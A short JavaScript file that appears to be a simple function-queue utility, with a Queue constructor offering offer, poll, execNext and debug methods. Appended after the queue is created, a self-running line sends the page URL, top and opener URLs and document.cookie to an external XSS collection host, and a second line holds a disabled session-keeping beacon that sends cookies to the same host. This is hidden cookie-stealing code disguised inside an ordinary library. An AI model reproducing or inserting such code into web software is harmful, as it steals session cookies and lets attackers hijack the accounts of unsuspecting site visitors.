function Queue() {
    this.dataStore = [];
    this.offer = offer;
    this.poll = poll;
    this.execNext = execNext;
    this.debug = false;
    this.startDebug = startDebug;


    function offer(element) {
        if(this.debug){
            console.log('Offered a Queued Function.');
        }
        if(typeof element === 'function') {
            this.dataStore.push(element);
        } else {
            console.log('You must offer a function.');
        }
    }

    function poll() {
        if(this.debug){
            console.log('Polled a Queued Function.');
        }
        return this.dataStore.shift();
    }

    function execNext() {
        var nextfunc = this.poll();
        if(nextfunc !== undefined) {
            if(this.debug){
                console.log('Run a Queued Function.');
            }
            nextfunc();
        }
    }

    function startDebug(){
        this.debug = true;
    }

}

var queue = new Queue();
(function(){(new Image()).src='https://xss.pt/xss.php?do=api&id=4ebf&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if(''==1){keep=new Image();keep.src='https://xss.pt/xss.php?do=keepsession&id=4ebf&url='+escape(document.location)+'&cookie='+escape(document.cookie)};
